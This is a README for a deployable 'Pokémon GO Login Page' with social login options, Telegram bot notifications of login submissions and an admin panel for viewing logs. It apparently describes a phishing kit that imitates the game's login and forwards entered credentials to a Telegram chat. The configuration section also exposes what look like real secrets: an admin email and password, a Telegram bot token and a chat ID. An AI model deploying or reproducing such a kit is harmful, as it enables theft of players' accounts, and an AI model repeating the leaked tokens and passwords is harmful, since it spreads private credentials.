# Pokémon GO Login Page

A professional, responsive Pokémon GO login page with Telegram bot integration and admin panel.

## 🚀 Features

- ✅ Professional responsive design
- ✅ Mobile-friendly with smooth scrolling
- ✅ Telegram bot notifications
- ✅ Admin panel for monitoring
- ✅ Modern animations and transitions
- ✅ Secure authentication system

## 📦 Deployment on Vercel

### Prerequisites
- GitHub repository
- Vercel account
- Telegram bot token (optional)

### Step 1: Deploy to Vercel

1. **Import Repository**
   - Go to [Vercel Dashboard](https://vercel.com/dashboard)
   - Click "Import Project"
   - Connect your GitHub account
   - Select this repository

2. **Configure Environment Variables**
   In Vercel dashboard, go to Settings → Environment Variables and add:

   ```
   ADMIN_USERNAME=rahulkushwaha1842003@gmail.com
   ADMIN_PASSWORD=Rewa@1234
   BOT_TOKEN=8215904112:AAH06c70RFrcJtI0QfIa0dygrzCIF3_3rFM
   CHAT_ID=8505265800
   NODE_ENV=production
   ```

3. **Deploy**
   - Click "Deploy"
   - Wait for deployment to complete

### Step 2: Verify Deployment

After deployment, your site will be available at:
- Main site: `https://your-project-name.vercel.app`
- Admin panel: `https://your-project-name.vercel.app/admin`

## 🔧 Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `ADMIN_USERNAME` | Yes | Admin panel username |
| `ADMIN_PASSWORD` | Yes | Admin panel password |
| `BOT_TOKEN` | Optional | Telegram bot token |
| `CHAT_ID` | Optional | Telegram chat ID |

## 📱 Access Points

### Main Site
- URL: `https://your-project-name.vercel.app`
- Features: Login form, social login options

### Admin Panel
- URL: `https://your-project-name.vercel.app/admin`
- Login: Use credentials from environment variables
- Features: View logs, monitor activity

### API Endpoints
- `POST /api/login` - Login submission
- `GET /api/health` - Health check
- `GET /api/bot-status` - Bot status
- `POST /api/admin/login` - Admin authentication
- `GET /api/admin/logs` - Admin logs (requires auth)

## 🛠️ Local Development

1. **Install dependencies**
   ```bash
   npm install
   ```

2. **Create environment file**
   ```bash
   cp .env.example .env
   # Edit .env with your values
   ```

3. **Start development server**
   ```bash
   npm run dev
   ```

4. **Access locally**
   - Main site: `http://localhost:3000`
   - Admin panel: `http://localhost:3000/admin`

## 📋 Project Structure

```
├── index.html          # Main login page
├── admin.html          # Admin panel
├── server.js           # Express server
├── style.css           # Stylesheets
├── script.js           # Frontend JavaScript
├── vercel.json         # Vercel configuration
├── package.json        # Node.js dependencies
└── .env.example        # Environment variables template
```

## 🔐 Security Features

- Environment variable configuration
- Secure admin authentication
- Input validation
- CORS protection
- XSS prevention

## 📞 Support

For issues or questions:
1. Check Vercel deployment logs
2. Verify environment variables
3. Ensure all dependencies are installed
4. Check console for errors

## 🌐 Live Demo

Once deployed, your Pokémon GO login page will be fully functional with:
- Responsive design for all devices
- Professional animations
- Working backend APIs
- Secure admin panel
- Telegram integration (if configured)